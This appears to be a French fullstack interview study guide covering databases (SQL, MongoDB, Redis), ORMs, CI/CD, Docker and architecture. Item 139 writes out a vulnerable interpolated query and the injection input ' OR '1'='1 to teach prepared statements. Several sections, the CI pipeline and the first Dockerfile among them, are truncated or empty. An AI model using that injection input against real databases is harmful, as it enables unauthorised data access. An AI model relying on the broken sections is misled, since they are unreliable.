| | SQL (PostgreSQL, MySQL) | NoSQL (MongoDB, Redis) |
|---|---|---|
| Structure | Tables, schéma fixe | Documents, schéma flexible |
| Relations | Jointures natives | Références ou données imbriquées |
| Scalabilité | Verticale (surtout) | Horizontale (sharding facile) |
| Cas d'usage | Données structurées, transactions critiques (finance) | Données évolutives, volumes massifs, prototypage rapide |

```sql
-- SQL : schéma rigide
CREATE TABLE users (id SERIAL PRIMARY KEY, nom VARCHAR(100), email VARCHAR(100));
```
```js
// NoSQL : documents flexibles
{ nom: "Essama", email: "e@test.com", hobbies: ["code", "foot"] } // pas de schéma imposé
```

---

**98. Clé primaire et clé étrangère**

```sql
CREATE TABLE users (
  id SERIAL PRIMARY KEY,           -- clé primaire : identifiant unique de chaque ligne
  nom VARCHAR(100)
);

CREATE TABLE commandes (
  id SERIAL PRIMARY KEY,
  user_id INTEGER REFERENCES users(id), -- clé étrangère : lie une commande à un utilisateur
  produit VARCHAR(100)
);
```
La clé étrangère garantit l'**intégrité référentielle** : impossible d'insérer une commande avec un `user_id` qui n'existe pas dans `users` (contrainte vérifiée par la base elle-même).

---

**99. Index et performances**

Un index est une structure auxiliaire (souvent un arbre B) qui accélère la recherche, comme l'index d'un livre.

```sql
CREATE INDEX idx_email ON users(email);

-- Sans index : la DB scanne TOUTES les lignes (O(n))
-- Avec index : recherche quasi instantanée (O(log n))
SELECT * FROM users WHERE email = 'test@example.com';
```
**Piège** : indexer trop de colonnes ralentit les écritures (`INSERT`/`UPDATE`), car chaque index doit être mis à jour à chaque modification. Règle pratique : indexer les colonnes fréquemment utilisées dans `WHERE`, `JOIN`, `ORDER BY` — pas systématiquement toutes les colonnes.

---

**100. Transaction et ACID**

Une transaction regroupe plusieurs opérations qui doivent **toutes** réussir, ou **aucune** (ex: virement bancaire = débiter A + créditer B).

```sql
BEGIN;
UPDATE comptes SET solde = solde - 100 WHERE id = 1;
UPDATE comptes SET solde = solde + 100 WHERE id = 2;
COMMIT; -- si une des deux échoue, ROLLBACK annule tout
```
ACID :
- **Atomicity** : tout ou rien.
- **Consistency** : la DB reste dans un état valide (contraintes respectées).
- **Isolation** : les transactions concurrentes ne s'interfèrent pas.
- **Durability** : une fois validée (`COMMIT`), la donnée survit même à un crash serveur.

## SQL (101-109)

**101. Migration de base de données**

Un fichier versionné qui décrit une modification du schéma DB (créer une table, ajouter une colonne), permettant de reproduire l'état exact de la DB sur n'importe quelle machine (dev, staging, prod).

```js
// Exemple avec un ORM (Sequelize/Prisma)
// migration_20260101_ajout_telephone.js
exports.up = (db) => db.addColumn('users', 'telephone', { type: 'string' });
exports.down = (db) => db.removeColumn('users', 'telephone'); // pour annuler
```
Pourquoi c'est essentiel en équipe : sans migrations, chaque développeur doit modifier son schéma DB manuellement — source d'incohérences et d'erreurs difficiles à tracer entre environnements.

---

**102. PostgreSQL / MySQL**

- **PostgreSQL** : très respectueux des standards SQL, types de données riches (JSON natif, tableaux, types géométriques), excellente gestion des transactions concurrentes, extensible (extensions comme PostGIS).
- **MySQL** : historiquement plus simple à prendre en main, très répandu (WordPress, beaucoup d'hébergeurs mutualisés), performant en lecture simple.

En 2026, PostgreSQL est généralement recommandé par défaut pour un nouveau projet fullstack, sauf contrainte d'hébergement spécifique.

---

**103. Requête SQL avec WHERE**

```sql
SELECT nom, email FROM users WHERE age >= 18 AND ville = 'Douala';
```
**Erreur fréquente** : oublier que les chaînes de caractères doivent être entre quotes simples (`'Douala'`), et que les comparaisons sont sensibles au type — `age = '25'` fonctionne souvent mais peut poser problème selon le moteur si `age` est un entier strict.

---

**104. Types de JOIN**

```sql
-- INNER JOIN : uniquement les lignes qui matchent des deux côtés
SELECT u.nom, c.produit FROM users u
INNER JOIN commandes c ON u.id = c.user_id;

-- LEFT JOIN : tous les users, même sans commande (NULL si pas de match)
SELECT u.nom, c.produit FROM users u
LEFT JOIN commandes c ON u.id = c.user_id;

-- RIGHT JOIN : l'inverse — toutes les commandes, même orphelines
-- FULL OUTER JOIN : tout des deux côtés, avec NULL là où il n'y a pas de correspondance
```
**Piège classique** : utiliser `INNER JOIN` par réflexe alors qu'on veut afficher "tous les utilisateurs, même ceux sans commande" — ça les fait disparaître silencieusement du résultat.

---

**105. GROUP BY et HAVING**

```sql
-- Combien de commandes par utilisateur
SELECT user_id, COUNT(*) AS nb_commandes
FROM commandes
GROUP BY user_id
HAVING COUNT(*) > 5; -- filtre APRÈS l'agrégation
```
`WHERE` filtre les lignes **avant** l'agrégation, `HAVING` filtre les groupes **après** — c'est pourquoi on ne peut pas utiliser `WHERE COUNT(*) > 5` (l'agrégat n'existe pas encore à ce stade de l'exécution).

---

**106. Sous-requête (subquery)**

```sql
-- Utilisateurs ayant passé au moins une commande
SELECT * FROM users
WHERE id IN (SELECT DISTINCT user_id FROM commandes);
```
Une requête imbriquée dans une autre. Utile mais souvent moins performante qu'un `JOIN` équivalent sur de gros volumes — à privilégier quand la logique est plus lisible en sous-requête (ex: comparaison à une valeur agrégée).

---

**107. Fonctions d'agrégation**

```sql
SELECT
  COUNT(*) AS total_commandes,
  SUM(montant) AS chiffre_affaires,
  AVG(montant) AS panier_moyen,
  MAX(montant) AS plus_grosse_commande,
  MIN(montant) AS plus_petite_commande
FROM commandes;
```
Toujours utilisées avec `GROUP BY` si on veut ces valeurs **par catégorie** (ex: par utilisateur), sinon elles s'appliquent sur l'ensemble du résultat.

---

**108. Stored procedure / fonction SQL**

```sql
CREATE FUNCTION calculer_remise(montant NUMERIC) RETURNS NUMERIC AS $$
BEGIN
  IF montant > 1000 THEN RETURN montant * 0.9;
  ELSE RETURN montant;
  END IF;
END;
$$ LANGUAGE plpgsql;

SELECT calculer_remise(1500); -- 1350
```
Logique métier exécutée directement dans la base de données. Avantage : performance (évite l'aller-retour réseau application ↔ DB), cohérence garantie même si plusieurs applications accèdent à la même DB. Inconvénient : logique métier "cachée" hors du code applicatif versionné, plus difficile à tester/déboguer qu'une fonction JS classique.

---

**109. VIEW**

```sql
CREATE VIEW commandes_recentes AS
SELECT * FROM commandes WHERE date_creation > NOW() - INTERVAL '30 days';

SELECT * FROM commandes_recentes WHERE user_id = 5; -- comme une table normale
```
Une vue est une requête sauvegardée qui se comporte comme une table virtuelle — simplifie des requêtes complexes répétées, et peut masquer certaines colonnes sensibles à des utilisateurs ayant seulement accès à la vue.

## NoSQL (110-112)

**110. MongoDB — documents et collections**

```js
// Un "document" MongoDB (équivalent d'une ligne SQL), format proche du JSON (BSON)
{
  _id: ObjectId("..."),
  nom: "Essama",
  email: "e@test.com",
  commandes: [{ produit: "Livre", prix: 15 }] // structure imbriquée possible
}
```
Une **collection** regroupe des documents (équivalent d'une table SQL), mais sans schéma imposé — deux documents de la même collection peuvent avoir des champs différents.

```js
db.users.insertOne({ nom: "Essama", email: "e@test.com" });
db.users.find({ nom: "Essama" });
```

---

**111. Embeddé vs référencé**

```js
// Embeddé : les commandes sont DANS le document utilisateur
{ nom: "Essama", commandes: [{ produit: "Livre", prix: 15 }] }

// Référencé : lien vers une autre collection, comme une clé étrangère SQL
{ nom: "Essama", commandeIds: [ObjectId("...")] }
// collection séparée "commandes"
{ _id: ObjectId("..."), produit: "Livre", prix: 15, userId: ObjectId("...") }
```
**Embeddé** : lecture rapide (une seule requête), mais document qui peut grossir indéfiniment (mauvais si "commandes" est illimité dans le temps).
**Référencé** : évite les documents surdimensionnés, mais nécessite plusieurs requêtes (ou `$lookup`, l'équivalent MongoDB d'un JOIN).

**Règle pratique** : embeddé pour des données "possédées" et de taille bornée (adresse d'un user), référencé pour des données volumineuses ou partagées entre plusieurs documents.

---

**112. Sharding et réplication**

- **Réplication** : plusieurs copies de la même donnée sur différents serveurs (replica set) → haute disponibilité, si un serveur tombe, un autre prend le relais automatiquement.
- **Sharding** : la donnée est **répartie** (pas dupliquée) sur plusieurs serveurs selon une clé de partitionnement (shard key) → permet de scaler horizontalement quand une seule machine ne suffit plus à stocker/traiter tout le volume.

```
Réplication : Serveur A [toutes les données] = Serveur B [toutes les données] = Serveur C [copie]
Sharding :    Serveur A [users 1-1000] | Serveur B [users 1001-2000] | Serveur C [users 2001-3000]
```
En pratique, les deux sont souvent combinés (chaque shard est lui-même répliqué).

## ORM & Connexion (113-115)

**113. ORM (Object-Relational Mapping)**

Une couche qui permet de manipuler la base de données avec des objets JS/Python au lieu d'écrire du SQL brut.

```js
// Sans ORM
db.query('SELECT * FROM users WHERE id = ?', [id]);

// Avec un ORM (Prisma)
await prisma.user.findUnique({ where: { id } });

// Avec Mongoose (MongoDB)
await User.findById(id);
```
Avantages : code plus lisible, moins de SQL manuel à maintenir, protection native contre l'injection SQL, migrations gérées automatiquement (Prisma, Sequelize).
Inconvénient : abstraction qui peut cacher des requêtes inefficaces générées automatiquement — sur des requêtes complexes, le SQL brut reste parfois plus performant.

---

**114. Connecter Node.js à MongoDB (Mongoose)**

```js
const mongoose = require('mongoose');
mongoose.connect(process.env.DATABASE_URL);

const userSchema = new mongoose.Schema({
  nom: { type: String, required: true },
  email: { type: String, required: true, unique: true },
  age: { type: Number, min: 0 }
});

const User = mongoose.model('User', userSchema);

const nouvelUtilisateur = await User.create({ nom: "Essama", email: "e@test.com" });
```
Mongoose ajoute une **structure de schéma** au-dessus de MongoDB (normalement sans schéma), avec validation, types, et méthodes pratiques — un compromis entre la flexibilité NoSQL et la rigueur SQL.

---

**115. Redis**

Base de données en mémoire (donc extrêmement rapide), clé-valeur, souvent utilisée en complément d'une DB principale.

```js
const redis = require('redis');
const client = redis.createClient();

// Cache : éviter de refaire un calcul/requête coûteuse
await client.set('user:42', JSON.stringify(userData), { EX: 3600 }); // expire dans 1h
const cache = await client.get('user:42');

// Session
await client.set(`session:${sessionId}`, JSON.stringify({ userId: 42 }));
```
Cas d'usage : cache (réduire la charge DB), stockage de sessions, rate limiting, files d'attente légères (queues), classements en temps réel. **Attention** : les données en RAM sont volatiles par défaut — Redis propose une persistance optionnelle (RDB/AOF) mais ce n'est pas sa vocation première.

## DevOps & Déploiement (116-123)

**116. CI/CD**

- **CI (Continuous Integration)** : chaque push déclenche automatiquement les tests + build, pour détecter les bugs tôt.
- **CD (Continuous Deployment/Delivery)** : le code validé est automatiquement déployé (Deployment) ou prêt à l'être en un clic (Delivery).

Bénéfices : moins de bugs en production (détectés avant), déploiements plus fréquents et moins risqués (petits changements incrémentaux), moins de travail manuel répétitif.

**117. Pipeline CI/CD (GitHub Actions)**

```yaml
# .github/workflows/ci.yml
name: CI
on: [push]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4

```
Chaque étape (`step`) doit réussir pour passer à la suivante. Si `npm test` échoue, le déploiement est automatiquement bloqué — évite qu'un code cassé arrive en production.

**118. Docker et conteneurisation**

```dockerfile

COPY package*.json ./
```


**119. Kubernetes**

Orchestrateur de conteneurs : gère automatiquement le déploiement, la mise à l'échelle (scaling), le redémarrage en cas de crash, et la répartition de charge entre plusieurs conteneurs Docker, sur un cluster de machines.

Utile à partir d'une certaine échelle (plusieurs services, forte charge) ; pour un petit projet, Docker seul (ou une plateforme comme Vercel/Heroku) suffit largement — Kubernetes ajoute une complexité opérationnelle significative.

**120. Reverse proxy (Nginx)**

Un serveur qui reçoit les requêtes des clients et les redirige vers le bon serveur applicatif en interne, tout en cachant l'infrastructure réelle.

Rôles courants : terminaison SSL/HTTPS, répartition de charge (load balancing) entre plusieurs instances, mise en cache de fichiers statiques, protection (masque le serveur applicatif réel des attaques directes).

**123. Environnements (dev/staging/production)**

## Architecture & Design (124-127)

**124. Scalabilité**

```
Scaling vertical   : augmenter les ressources d'UNE machine (plus de RAM/CPU)
Scaling horizontal : ajouter PLUSIEURS machines qui se partagent la charge
```
Vertical = plus simple, mais limité physiquement (une machine a un plafond) et point de défaillance unique.
Horizontal = illimité en théorie, plus résilient (une machine tombe, les autres continuent), mais nécessite une architecture stateless (pas de données stockées uniquement en mémoire locale d'un serveur) et un load balancer.

---

**125. Microservices vs Monolithe**

```
Monolithe : une seule application qui gère tout (auth, paiement, catalogue...)
Microservices : plusieurs petits services indépendants, chacun avec sa propre DB, communiquant via API/messages
```
Monolithe : plus simple à développer/déployer au départ, mais devient difficile à faire évoluer à grande échelle (toute l'équipe travaille sur le même code).
Microservices : équipes indépendantes, scaling ciblé par service, mais complexité opérationnelle bien plus élevée (réseau, cohérence des données, monitoring distribué). **Piège fréquent** : adopter les microservices trop tôt sur un petit projet — la complexité ajoutée dépasse largement le bénéfice.

---

**126. Design patterns**

```js
// Singleton — une seule instance partagée
class ConnexionDB {
  static instance;
  static getInstance() {
    if (!this.instance) this.instance = new ConnexionDB();
    return this.instance;
  }
}

// Factory — délègue la création d'objets
function creerVehicule(type) {
  if (type === 'voiture') return new Voiture();
  if (type === 'moto') return new Moto();
}

// Observer — notifie plusieurs "abonnés" d'un changement
class EventEmitter {
  listeners = [];
  subscribe(fn) { this.listeners.push(fn); }
  emit(data) { this.listeners.forEach(fn => fn(data)); }
}
```
**CQRS** (Command Query Responsibility Segregation) : sépare les opérations de lecture (query) et d'écriture (command) dans des modèles distincts — utile sur des systèmes à forte charge où les besoins de lecture et d'écriture divergent beaucoup.

---

**127. Caching**

```js
// Cache applicatif avec Redis
async function getProduits() {
  const cache = await redis.get('produits');
  if (cache) return JSON.parse(cache); // évite de retaper la DB

  const produits = await db.query('SELECT * FROM produits');
  await redis.set('produits', JSON.stringify(produits), { EX: 300 }); // 5 min
  return produits;
}
```
Niveaux de cache : navigateur (headers HTTP `Cache-Control`), CDN (fichiers statiques proches géographiquement de l'utilisateur), applicatif (Redis), base de données (cache de requêtes interne).

**Piège classique** : cache **périmé** (stale) affiché après une mise à jour des données — nécessite une stratégie d'invalidation claire (TTL court, ou invalidation manuelle à chaque écriture).

## Surveillance & Tests (128-131)

**128. Types de tests**

```js
// Test unitaire — une seule fonction, isolée
test('addition(2,3) retourne 5', () => {
  expect(addition(2, 3)).toBe(5);
});

// Test d'intégration — plusieurs modules ensemble (ex: API + DB de test)
test('POST /users crée un utilisateur', async () => {
  const res = await request(app).post('/users').send({ nom: 'Test' });
  expect(res.status).toBe(201);
});

// Test end-to-end (E2E) — simule un vrai parcours utilisateur dans le navigateur
test('utilisateur peut se connecter', async () => {
  await page.fill('#email', 'test@test.com');
  await page.click('#submit');
  expect(await page.textContent('h1')).toBe('Bienvenue');
});
```
Pyramide des tests : beaucoup de tests unitaires (rapides, peu coûteux), moins de tests d'intégration, encore moins de E2E (lents, fragiles, mais couvrent le parcours réel).

---

**129. Test-Driven Development (TDD)**

Cycle "Red → Green → Refactor" :
1. Écrire un test qui échoue (la fonctionnalité n'existe pas encore) — **Red**.
2. Écrire le code minimal pour faire passer le test — **Green**.
3. Améliorer le code sans casser le test — **Refactor**.

```js
// 1. Red
test('estMajeur(20) retourne true', () => {
  expect(estMajeur(20)).toBe(true); // estMajeur n'existe pas encore → échec
});

// 2. Green
function estMajeur(age) { return age >= 18; }

// 3. Refactor si nécessaire
```
Avantage : force à clarifier le comportement attendu avant de coder, garantit une couverture de test dès le départ. Inconvénient : plus lent au début, pas toujours adapté à du prototypage exploratoire.

---

**130. Observabilité**

Capacité à comprendre l'état interne d'un système à partir de ses sorties externes, via 3 piliers :

```
Logs    : événements horodatés ("Erreur DB à 14h32")
Métriques : valeurs numériques agrégées dans le temps (temps de réponse moyen, nb requêtes/sec)
Traces  : suivi d'une requête à travers plusieurs services (utile en microservices)
```
Sans observabilité, diagnostiquer un problème en production revient à chercher à l'aveugle — les 3 piliers combinés permettent de répondre à "quoi", "combien", et "où" pour un incident donné.

---

**131. Surveiller une application en production**

- **Sentry** : capture automatiquement les erreurs/exceptions avec leur contexte (stack trace, utilisateur concerné).
- **Prometheus** : collecte de métriques (CPU, RAM, requêtes/sec), avec Grafana pour la visualisation en dashboards.
- **ELK (Elasticsearch, Logstash, Kibana)** : centralisation et recherche dans les logs de tous les serveurs.

```js
// Sentry — capture automatique des erreurs non gérées
Sentry.init({ dsn: "https://xxx@sentry.io/xxx" });
app.use(Sentry.Handlers.errorHandler());
```
Objectif : être alerté **avant** que les utilisateurs signalent le problème, et avoir assez de contexte pour le résoudre rapidement.

## Bases de Données — SQL & Optimisation (137-148)

**137. Clé composite**

Une clé primaire formée de **plusieurs colonnes** combinées, utilisée quand aucune colonne seule ne garantit l'unicité.

```sql
CREATE TABLE inscriptions (
  etudiant_id INTEGER,
  cours_id INTEGER,
  date_inscription DATE,
  PRIMARY KEY (etudiant_id, cours_id) -- la paire doit être unique, pas chaque colonne isolément
);
```
Cas d'usage typique : table de liaison many-to-many (un étudiant peut être inscrit à plusieurs cours, mais pas deux fois au même cours).

---

**138. DELETE vs TRUNCATE vs DROP**

| | Portée | Rollback possible ? | Vitesse |
|---|---|---|---|
| `DELETE FROM t WHERE ...` | Lignes ciblées | Oui (transaction) | Lent (ligne par ligne, déclenche les triggers) |
| `TRUNCATE TABLE t` | Toutes les lignes | Non (généralement) | Rapide (vide la table sans scanner) |
| `DROP TABLE t` | La table entière (structure incluse) | Non | Immédiat |

**Piège fréquent** : confondre `TRUNCATE` avec un `DELETE` rapide — `TRUNCATE` réinitialise aussi les compteurs auto-incrémentés (`SERIAL`/`AUTO_INCREMENT`), ce qui peut casser une logique qui dépend d'ID toujours croissants.

---

**139. Requête préparée**

```js
// VULNÉRABLE — injection SQL possible
db.query(`SELECT * FROM users WHERE email = '${email}'`);

// Requête préparée — le paramètre est envoyé SÉPARÉMENT du SQL
db.query('SELECT * FROM users WHERE email = $1', [email]);
```
Le moteur SQL compile d'abord la requête avec des "trous" (`$1`, `?`), puis insère les valeurs **sans jamais les interpréter comme du code SQL** — même si `email` contient `' OR '1'='1`, il est traité comme une simple chaîne de caractères littérale, neutralisant l'injection.

---

**140. Analyser une requête lente (EXPLAIN/ANALYZE)**

```sql
EXPLAIN ANALYZE
SELECT * FROM commandes WHERE user_id = 42;
```
```
Seq Scan on commandes  (cost=0.00..1834.00 rows=50 width=120) (actual time=0.02..12.4 rows=48)
  Filter: (user_id = 42)
```
`Seq Scan` (scan séquentiel = parcourt toute la table) est un signal d'alerte sur une grosse table — indique généralement qu'un index manque sur `user_id`. Après ajout d'un index, on s'attend à voir `Index Scan` avec un coût bien plus bas.

**Erreur classique** : ajouter des index "au feeling" sans vérifier avec `EXPLAIN` si la requête les utilise réellement.

---

**141. Normalisation et formes normales**

Objectif : éliminer la redondance de données.

```sql
-- Non normalisé (1FN violée) : plusieurs valeurs dans une cellule
| commande_id | produits            |
| 1           | "Livre, Stylo, Cahier" |

-- 1FN : une seule valeur atomique par cellule
| commande_id | produit |
| 1           | Livre   |
| 1           | Stylo   |
```
- **1FN** : chaque colonne contient une valeur atomique (pas de liste dans une cellule).
- **2FN** : 1FN + chaque colonne non-clé dépend de la **totalité** de la clé primaire (pertinent surtout avec clé composite).
- **3FN** : 2FN + aucune colonne non-clé ne dépend d'une autre colonne non-clé (pas de dépendance transitive — ex: `ville` ne devrait pas dépendre de `code_postal` dans la même table si `code_postal` n'est pas la clé).

---

**142. Dénormalisation**

Réintroduire volontairement de la redondance pour **accélérer la lecture**, au prix de la cohérence facile à maintenir.

```sql
-- Normalisé : il faut un JOIN pour afficher le nom de l'auteur avec chaque article
SELECT a.titre, u.nom FROM articles a JOIN users u ON a.auteur_id = u.id;

-- Dénormalisé : le nom est dupliqué directement dans articles
SELECT titre, nom_auteur FROM articles; -- pas de JOIN, plus rapide en lecture
```
Utile quand les lectures sont bien plus fréquentes que les écritures (ex: dashboard analytique) — mais chaque mise à jour du nom d'un auteur doit alors être répercutée dans toutes les lignes dupliquées, sinon incohérence.

---

**143. Types d'index**

```sql
CREATE INDEX idx_email ON users(email);           -- B-tree (défaut) : bon pour =, <, >, tri
CREATE INDEX idx_email_hash ON users USING HASH(email); -- Hash : bon uniquement pour =
CREATE INDEX idx_contenu ON articles USING GIN(to_tsvector('french', contenu)); -- Full-text
```
- **B-tree** : le plus polyvalent, gère égalité, comparaisons, tri, plage (`BETWEEN`).
- **Hash** : très rapide pour l'égalité stricte uniquement, inutile pour `ORDER BY` ou `<`/`>`.
- **Full-text** : recherche de mots dans du texte long (`to_tsvector`/`to_tsquery` en PostgreSQL), bien plus performant qu'un `LIKE '%mot%'`.

---

**144. Transaction et verrous**

```sql
BEGIN;
SELECT * FROM comptes WHERE id = 1 FOR UPDATE; -- verrouille la ligne
UPDATE comptes SET solde = solde - 100 WHERE id = 1;
COMMIT; -- libère le verrou
```
`FOR UPDATE` empêche une autre transaction concurrente de modifier (ou parfois même lire) la même ligne tant que la transaction en cours n'est pas terminée — évite les conditions de course (ex: deux virements simultanés qui liraient le même solde avant mise à jour).

---

**145. Niveaux d'isolation**

| Niveau | Empêche |
|---|---|
| READ UNCOMMITTED | Rien (peut lire des données non validées d'une autre transaction — "dirty read") |
| READ COMMITTED | Dirty read (défaut PostgreSQL) |
| REPEATABLE READ | + "non-repeatable read" (relire la même ligne donne toujours le même résultat dans la transaction) |
| SERIALIZABLE | + "phantom read" — comportement équivalent à des transactions strictement séquentielles |

Plus le niveau est strict, plus la cohérence est garantie, mais plus la performance/concurrence baisse (plus de verrous, plus d'attentes ou d'échecs à réessayer).

---

**146. Deadlock**

```
Transaction A : verrouille ligne 1, attend ligne 2
Transaction B : verrouille ligne 2, attend ligne 1
→ blocage mutuel permanent
```
Le moteur SQL détecte généralement automatiquement le deadlock et **annule une des deux transactions** (avec une erreur explicite), l'application doit alors réessayer.

**Prévention** : toujours verrouiller les ressources dans le **même ordre** dans tout le code (ex: toujours par ID croissant), garder les transactions courtes, éviter les verrous manuels inutiles.

---

**147. Relations many-to-many**

```sql
CREATE TABLE etudiants (id SERIAL PRIMARY KEY, nom VARCHAR(100));
CREATE TABLE cours (id SERIAL PRIMARY KEY, titre VARCHAR(100));

-- Table de jointure (junction table)
CREATE TABLE inscriptions (
  etudiant_id INTEGER REFERENCES etudiants(id),
  cours_id INTEGER REFERENCES cours(id),
  PRIMARY KEY (etudiant_id, cours_id)
);

-- Tous les cours d'un étudiant
SELECT c.titre FROM cours c
JOIN inscriptions i ON c.id = i.cours_id
WHERE i.etudiant_id = 5;
```
SQL n'a pas de relation many-to-many "directe" — elle s'implémente toujours via une table intermédiaire avec deux clés étrangères.

---

**148. Colonne générée (generated column)**

```sql
CREATE TABLE commandes (
  prix_unitaire NUMERIC,
  quantite INTEGER,
  total NUMERIC GENERATED ALWAYS AS (prix_unitaire * quantite) STORED
);
```
Une colonne calculée automatiquement à partir d'autres colonnes de la même ligne — évite de dupliquer la logique de calcul dans chaque requête ou dans le code applicatif, et garantit que `total` est toujours cohérent avec `prix_unitaire` et `quantite`.

## NoSQL Avancé (149-154)

**149. MongoDB vs Cassandra**

- **MongoDB** : orienté documents, requêtes flexibles (filtres complexes, agrégations), bon compromis lecture/écriture, plus simple à démarrer.
- **Cassandra** : orienté colonnes larges (wide-column), pensé pour l'**écriture massive** distribuée sur de nombreux nœuds sans point de défaillance unique, requêtes plus limitées (il faut concevoir le schéma en fonction des requêtes à l'avance).

**Règle pratique** : MongoDB pour la plupart des cas d'usage applicatifs classiques ; Cassandra quand le volume d'écriture est extrême et distribué géographiquement (ex: IoT à très grande échelle, séries temporelles massives).

---

**150. Document vs key-value vs column-family vs graph**

```
Key-value   : { "user:42": "{...blob...}" }                    → Redis, DynamoDB
Document    : { _id: 42, nom: "Essama", commandes: [...] }      → MongoDB
Column-family : lignes avec colonnes dynamiques regroupées      → Cassandra
Graph       : nœuds + relations typées (Personne -[AMI_DE]-> Personne) → Neo4j
```
Le choix dépend de la structure naturelle des données : key-value pour du cache simple, document pour des objets semi-structurés, column-family pour de l'écriture massive, graph pour des données fortement **relationnelles** (réseaux sociaux, recommandations).

---

**151. Index MongoDB efficace**

```js
db.users.createIndex({ email: 1 }); // 1 = ascendant
db.commandes.createIndex({ user_id: 1, date: -1 }); // index composé

db.commandes.find({ user_id: 42 }).sort({ date: -1 }).explain("executionStats");
```
Un index composé `{user_id: 1, date: -1}` accélère les requêtes qui filtrent sur `user_id` **et** trient par `date` — mais l'ordre des champs dans l'index compte : il sera peu utile pour une requête qui filtre uniquement sur `date` sans `user_id`.

---

**152. Aggregation pipeline**

```js
db.commandes.aggregate([
  { $match: { statut: "livree" } },        // étape 1 : filtrer
  { $group: { _id: "$user_id", total: { $sum: "$montant" } } }, // étape 2 : agréger
  { $sort: { total: -1 } },                 // étape 3 : trier
  { $limit: 10 }                             // étape 4 : limiter
]);
```
Une séquence d'étapes (`$match`, `$group`, `$sort`, `$project`...) où chaque étape transforme le résultat de la précédente — l'équivalent MongoDB d'une requête SQL complexe avec `WHERE`, `GROUP BY`, `ORDER BY` combinés, mais exprimée sous forme de pipeline plutôt que de syntaxe déclarative unique.

---

**153. Transactions dans MongoDB**

```js
const session = client.startSession();
try {
  session.startTransaction();
  await comptes.updateOne({ _id: 1 }, { $inc: { solde: -100 } }, { session });
  await comptes.updateOne({ _id: 2 }, { $inc: { solde: 100 } }, { session });
  await session.commitTransaction();
} catch (err) {
  await session.abortTransaction(); // annule tout en cas d'erreur
}
```
Depuis MongoDB 4.0, les transactions multi-documents ACID sont supportées (auparavant, seule une opération sur **un seul** document était atomique). Reste plus coûteux en performance qu'en SQL — MongoDB recommande de d'abord repenser le schéma (embeddé) avant de recourir aux transactions.

---

**154. Firebase Firestore vs MongoDB**

Firestore est une base NoSQL orientée documents, **entièrement managée par Google**, avec synchronisation temps réel native et SDK client direct (le front-end peut lire/écrire sans back-end intermédiaire, sécurisé par des règles déclaratives).

```js
// Firestore — écoute en temps réel directement depuis le client
db.collection('messages').onSnapshot(snapshot => {
  snapshot.forEach(doc => console.log(doc.data()));
});
```
MongoDB offre plus de contrôle et de flexibilité de requêtage (agrégations complexes), mais nécessite un back-end pour y accéder. Firestore simplifie énormément les apps avec besoin de temps réel (chat, collaboration live) au prix d'un vendor lock-in Google et de requêtes moins expressives.

## ORM & Intégration (155-159)

**155. Prisma vs Sequelize/TypeORM**

```prisma
// schema.prisma
model User {
  id    Int    @id @default(autoincrement())
  email String @unique
  posts Post[]
}
```
```ts
const user = await prisma.user.findUnique({ where: { email }, include: { posts: true } });
```
Prisma génère un client **typé automatiquement** à partir du schéma (autocomplétion fiable en TypeScript), avec un système de migrations dédié (`prisma migrate`) et une syntaxe déclarative distincte du code applicatif. Sequelize/TypeORM utilisent une approche plus "classe/décorateur" proche de l'ORM traditionnel (Active Record ou Data Mapper), avec typage TS parfois moins strict.

---

**156. Migrations avec Prisma**

```bash
# Après modification du schema.prisma
npx prisma migrate dev --name ajout_telephone
```
Prisma compare le `schema.prisma` à l'état actuel de la DB, génère automatiquement le SQL nécessaire (fichier de migration versionné dans `prisma/migrations/`), et l'applique. Chaque migration est historisée et rejouable sur n'importe quel environnement pour garder les schémas synchronisés entre développeurs.

---

**157. Repository pattern**

```js
// Sans repository — logique DB mélangée au controller
app.get('/users/:id', async (req, res) => {
  const user = await db.query('SELECT * FROM users WHERE id = $1', [req.params.id]);
  res.json(user);
});

// Avec repository — logique DB isolée et réutilisable
class UserRepository {
  async findById(id) { return db.query('SELECT * FROM users WHERE id = $1', [id]); }
  async create(data) { /* ... */ }
}

app.get('/users/:id', async (req, res) => {
  const user = await userRepository.findById(req.params.id);
  res.json(user);
});
```
Isole l'accès aux données du reste de l'application — permet de changer de base de données ou de mocker facilement l'accès aux données dans les tests, sans toucher à la logique métier des controllers.

---

**158. Problème N+1**

```js
// N+1 : 1 requête pour les users + N requêtes (une par user) pour ses commandes
const users = await User.findAll();
for (const user of users) {
  user.commandes = await Commande.findAll({ where: { userId: user.id } }); // N requêtes !
}

// Solution : eager loading, tout en 1-2 requêtes
const users = await User.findAll({ include: Commande }); // Sequelize
const users = await prisma.user.findMany({ include: { commandes: true } }); // Prisma
```
Erreur de performance très fréquente et souvent invisible en développement (peu de données), mais catastrophique en production avec des milliers d'utilisateurs — 1 requête devient 1000+.

---

**159. Connection pooling**

```js
const pool = new Pool({
  host: 'localhost',
  max: 20, // nombre max de connexions simultanées dans le pool
  idleTimeoutMillis: 30000
});
```
Ouvrir une nouvelle connexion DB à chaque requête est coûteux (handshake réseau, authentification). Un pool maintient un ensemble de connexions déjà ouvertes et les réutilise entre les requêtes — critique en production sous forte charge, sinon la DB peut rapidement saturer son nombre de connexions maximum autorisées.

## DevOps — Conteneurisation & Orchestration (160-167)

**160. Dockerfile**

```dockerfile
FROM node:20-alpine       # image de base légère
WORKDIR /app                # dossier de travail dans le conteneur
COPY package*.json ./       # copie séparée pour profiter du cache Docker
RUN npm ci --production     # installation des dépendances
COPY . .                    # copie du reste du code
EXPOSE 3000
CMD ["node", "server.js"]   # commande de démarrage
```
**Bonne pratique clé** : copier `package.json` **avant** le reste du code — si seul le code change (pas les dépendances), Docker réutilise le cache de `npm ci` au lieu de tout réinstaller à chaque build.

---

**161. Image vs conteneur**

```
Image     = un "plan"/template immuable (comme une classe en POO)
Conteneur = une instance en cours d'exécution de cette image (comme un objet)
```
```bash
docker build -t mon-app .        # crée l'image
docker run mon-app                # lance UN conteneur à partir de l'image
docker run mon-app                # lance UN AUTRE conteneur, isolé du premier
```
On peut lancer plusieurs conteneurs indépendants depuis la même image, chacun avec son propre état d'exécution isolé.

---

**162. Docker Compose**

```yaml
# docker-compose.yml
services:
  app:
    build: .
    ports: ["3000:3000"]
    depends_on: [db]
  db:
    image: postgres:16
    environment:
      POSTGRES_PASSWORD: secret
    volumes: ["db-data:/var/lib/postgresql/data"]
volumes:
  db-data:
```
```bash
docker compose up
```
